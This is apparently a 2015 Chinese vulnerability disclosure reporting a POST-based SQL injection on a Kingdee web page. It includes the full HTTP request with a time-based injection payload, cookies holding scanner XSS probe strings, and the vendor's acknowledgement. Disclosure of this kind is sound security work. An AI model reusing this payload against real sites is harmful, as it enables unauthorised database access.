wybug_detail:
漏洞详情 披露状态：   									2015-09-08：	细节已通知厂商并且等待厂商处理中									2015-09-08：	厂商已经确认，细节仅向厂商公开									2015-09-18：	细节向核心白帽子及相关领域专家公开									2015-09-28：	细节向普通白帽子公开									2015-10-08：	细节向实习白帽子公开									2015-10-23：	细节向公众公开  简要描述： 如题 详细说明：  1.金蝶某站如下链接存在POST型sql注入
http://cms.kingdee.com/services/faq/question_main.jsp
2.POST包如下：
POST /services/faq/question_main.jsp HTTP/1.1Content-Length: 171Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://cms.kingdee.com:80/Cookie: JSESSIONID=B3FC5AA1A945B90A41D1D54CAC3DEBA7; Hm_lvt_aff7fbe8fcb98b060541077cc76465f2=1441203548,1441203638,1441203696,1441204045; Hm_lpvt_aff7fbe8fcb98b060541077cc76465f2=1441204045; pageReferrInSession=http%3A//www.acunetix-referrer.com/javascript%3AdomxssExecutionSink%280%2C%22%27%5C%22%3E%3Cxsstag%3E%28%29refdxss%22%29; bdshare_firstime=1441201833002; __utma=98319621.438929010.1441201833.1441201833.1441201833.1; __utmb=98319621; __utmc=98319621; __utmz=98319621.1441201833.1.1.utmccn=(referral)|utmcsr=acunetix-referrer.com|utmcct=/javascript:domxssExecutionSink(0,"'\"><xsstag>()refdxss")|utmcmd=referral; HMACCOUNT=437E1FDD8EF30AD9; BAIDUID=90CC7CA11654161A7D27E5BD6E0DFC57:FG=1; cc=suzNDAyNzQwMDQ1LDc0MDk2XzFfZmFsc2VfXw%3D%3D; trainingMenu=; trainingSelectMenu=; Hm_lvt_83ba2c95fe59851905a1013e2a458256=1441203112; Hm_lpvt_83ba2c95fe59851905a1013e2a458256=1441203112; firstEnterUrlInSession=http%3A//cms.kingdee.com/news/693.html; PHPSESSID=57osi5spo8722cc7dt8nic8i55Host: cms.kingdee.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*SeaButton=%b2%e9%a1%a1%d1%af&keyword=1&MaxChg=2008-12-29&MaxImp=2008-12-29&MinChg=2000-03-23&MinImp=2000-03-23&PCIDStr=0%2c1%2c&QID=-1;%20waitfor%20delay%20'0:0:0'%20--%20
3.参数PCIDStr存在问题：

   漏洞证明：  13个库

wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-09-08 10:06 厂商回复： 谢谢对金蝶安全的关注，我们已通知相关部门处理。 最新状态： 暂无
